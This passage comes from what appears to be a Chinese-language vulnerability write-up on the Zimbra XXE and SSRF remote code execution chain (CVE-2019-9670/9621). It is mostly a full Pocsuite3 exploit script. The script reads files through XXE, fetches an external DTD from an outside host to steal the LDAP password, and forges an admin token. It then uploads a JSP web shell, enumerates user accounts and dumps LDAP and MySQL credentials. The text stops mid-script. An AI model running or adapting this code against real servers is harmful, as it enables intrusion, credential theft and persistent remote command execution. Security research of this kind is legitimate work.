alt="image-20230403125818642"></a></p><p>这里对responseSchema也就是AcceptableResponseSchema标签中的值进行了判断，若不等于<code>http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006</code>或者<code>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</code>则返回503以及Requested response schema not available再加上responseSchema的值。因此此处存在回显型xxe。假设传入如下xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Request</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EMailAddress</span>&gt;</span>aaaaa<span class="tag">&lt;/<span class="name">EMailAddress</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">AcceptableResponseSchema</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Request</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时email不为空且responseSchema的值为&#x2F;etc&#x2F;passwd的内容，攻击者可以成功读取&#x2F;etc&#x2F;passwd的值：</p><p><a href="https://pic.imgdb.cn/item/642bec516ea21b9a9e42c512.jpg" title="image-20230403131401470" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec516ea21b9a9e42c512.jpg" alt="image-20230403131401470"></a></p><p>可以看到返回的结果正是<code>Requested response schema not available + /etc/passwd</code>，之后的adminToken的获取也正是基于此原理读取&#x2F;opt&#x2F;zimbra&#x2F;conf&#x2F;localconfig.xml文件获取zimbra_ldap_password。不过因为localconfig.xml文件会在解析器中被解析，无法以文本形式通过XXE漏洞被读出，需要加上<code>&lt;![CDATA[]]&gt;</code>，所以采用外部DTD的方式读取。</p><h3 id="Pocsuite-POC"><a href="#Pocsuite-POC" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbra 远程代码执行漏洞&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;远程代码执行&#x27;</span></span><br><span class="line">    <span class="comment"># 严重 高危 中危 低危</span></span><br><span class="line">    level = <span class="string">&#x27;严重&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2019-9670 CVE-2019-9621&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;Zimbra &lt; 8.7.11&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title=&quot;Zimbra 管理&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra提供一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。它最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    当 Zimbra 存在像任意文件读取、XXE（xml外部实体注入）这种漏洞时，攻击者可以利用此漏洞读取 localconfig.xml配置文件，获取到 zimbra admin ldap password，并通过 7071 admin 端口进行 SOAP AuthRequest 认证，得到 admin authtoken漏洞是利用XXE和ProxyServlet SSRF 漏洞拿到 admin authtoken 后，通过文件上传在服务端执行任意代码，威胁程度极高。当Zimbra服务端打来Memcached缓存服务是，可以利用SSRF攻击进行反序列化执行远程代码。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra 官方下载最新版本进行修复:https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_Vulnerable</span>(<span class="params">self</span>):</span><br><span class="line">        xml_check = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="string">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span></span><br><span class="line"><span class="string"> &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">      &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">  &lt;/Autodiscover&gt;&quot;&quot;&quot;</span></span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/Autodiscover/Autodiscover.xml&#x27;</span>, data=xml_check.encode(<span class="string">&#x27;utf-8&#x27;</span>),verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Error 503 Requested response&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_adminToken</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment">#https://raw.githubusercontent.com/nth347/Zimbra-RCE-exploit/master/malicious_dtd</span></span><br><span class="line">        xml1 = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE Autodiscover [</span></span><br><span class="line"><span class="string">        &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.135.1:1234/1.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">        %dtd;</span></span><br><span class="line"><span class="string">        %all;</span></span><br><span class="line"><span class="string">        ]&gt;</span></span><br><span class="line"><span class="string">&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;&quot;&quot;&quot;</span></span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/Autodiscover/Autodiscover.xml&#x27;</span>, data=xml1.encode(<span class="string">&#x27;utf-8&#x27;</span>),verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&amp;lt;/key&amp;gt;\s*&amp;lt;key name=&quot;zimbra_ldap_password&quot;&amp;gt;\s*&amp;lt;value&amp;gt;(.*?)&amp;lt;/value&amp;gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            password = re.findall(pattern, r.text)[<span class="number">0</span>]</span><br><span class="line">            xml2 = <span class="string">&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;</span></span><br><span class="line"><span class="string">               &lt;soap:Header&gt;</span></span><br><span class="line"><span class="string">                   &lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span></span><br><span class="line"><span class="string">                       &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;</span></span><br><span class="line"><span class="string">                   &lt;/context&gt;</span></span><br><span class="line"><span class="string">               &lt;/soap:Header&gt;</span></span><br><span class="line"><span class="string">               &lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">                 &lt;AuthRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;</span></span><br><span class="line"><span class="string">                    &lt;password&gt;&#123;&#125;&lt;/password&gt;</span></span><br><span class="line"><span class="string">                 &lt;/AuthRequest&gt;</span></span><br><span class="line"><span class="string">               &lt;/soap:Body&gt;</span></span><br><span class="line"><span class="string">            &lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(password)</span><br><span class="line">            r = requests.post(self.url + <span class="string">&#x27;/service/admin/soap&#x27;</span>, data=xml2.encode(<span class="string">&#x27;utf-8&#x27;</span>), verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;ZM_ADMIN_AUTH_TOKEN=(.*?);&#x27;</span>)</span><br><span class="line">            adminToken = re.findall(pattern, r.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">            adminToken = <span class="string">&quot;ZM_ADMIN_AUTH_TOKEN=&quot;</span> + adminToken</span><br><span class="line">            <span class="keyword">return</span> adminToken</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        self.adminToken = self.get_adminToken()</span><br><span class="line">        fileName = random_str(<span class="number">7</span>)+<span class="string">&quot;.jsp&quot;</span></span><br><span class="line">        file = &#123;</span><br><span class="line">            <span class="string">&#x27;filename1&#x27;</span>: (<span class="literal">None</span>, <span class="string">&quot;whocare&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">            <span class="string">&#x27;clientFile&#x27;</span>: (fileName,</span><br><span class="line">                           <span class="string">r&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;text/plain&quot;</span>),</span><br><span class="line">            <span class="string">&#x27;requestId&#x27;</span>: (<span class="literal">None</span>, <span class="string">&quot;12&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">        &#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(self.url + <span class="string">&quot;/service/extension/clientUploader/upload&quot;</span>, files=file, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        self.webshell = (fileName, <span class="string">&quot;sMuw1P2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;<span class="string">&#x27;sMuw1P2&#x27;</span>: command&#125;</span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/downloads/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshell[<span class="number">0</span>]), data=data, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetAllAccountsRequest</span>(<span class="params">self</span>):</span><br><span class="line">        xml = <span class="string">&quot;&quot;&quot;&lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;&lt;soap:Header&gt;&lt;context xmlns=&quot;urn:zimbra&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;authToken&gt;&#123;&#125;&lt;/authToken&gt;</span></span><br><span class="line"><span class="string">&lt;/context&gt;&lt;/soap:Header&gt;&lt;soap:Body&gt;</span></span><br><span class="line"><span class="string">&lt;GetAllAccountsRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/GetAllAccountsRequest&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span>.<span class="built_in">format</span>(self.adminToken.replace(<span class="string">&#x27;ZM_ADMIN_AUTH_TOKEN=&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        r = requests.post(self.url + <span class="string">&#x27;/service/admin/soap&#x27;</span>, data=xml.encode(<span class="string">&#x27;utf-8&#x27;</span>), verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        users = []</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;account name=&quot;(.*?)&quot; id=&quot;(.*?)&quot;&gt;[\s\S]*?&lt;a n=&quot;cn&quot;&gt;(.*?)&lt;/a&gt;[\s\S]*?&lt;a n=&quot;sn&quot;&gt;(.*?)&lt;/a&gt;[\s\S]*?&lt;/account&gt;&#x27;</span>)</span><br><span class="line">        result = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            userinfo = &#123;<span class="string">&#x27;zimbraId&#x27;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;sn&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;cn&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">            userinfo[<span class="string">&#x27;email&#x27;</span>] = i[<span class="number">0</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;zimbraId&#x27;</span>] = i[<span class="number">1</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;cn&#x27;</span>] = i[<span class="number">2</span>]</span><br><span class="line">            userinfo[<span class="string">&#x27;sn&#x27;</span>] = i[<span class="number">3</span>]</span><br><span class="line">            users.append(userinfo.copy())</span><br><span class="line">        <span class="keyword">return</span> users</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: self.adminToken,</span><br><span class="line">            <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;foo:7071&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(self.url+<span class="string">&#x27;/zimbraAdmin&#x27;</span>, verify=<span class="literal">False</span>, headers=headers, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.check_Vulnerable():</span><br><span class="line">                self.upload_webshell()</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url+<span class="string">&#x27;/zimbraAdmin&#x27;</span></span><br><span class="line">                <span class="comment"># Web网站相关信息</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># 网站默认首页的title信息（可能含有单位或组织信息）</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="comment">#所有账户信息</span></span><br><span class="line">                    <span class="string">&quot;users&quot;</span>: self.GetAllAccountsRequest()</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># 凭据类信息，针对各类弱口令、默认口令漏洞</span></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass = self.get_ldap_and_mysql_Info()</span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass,<span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 获取的文件信息, 针对各类文件读取类漏洞</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span 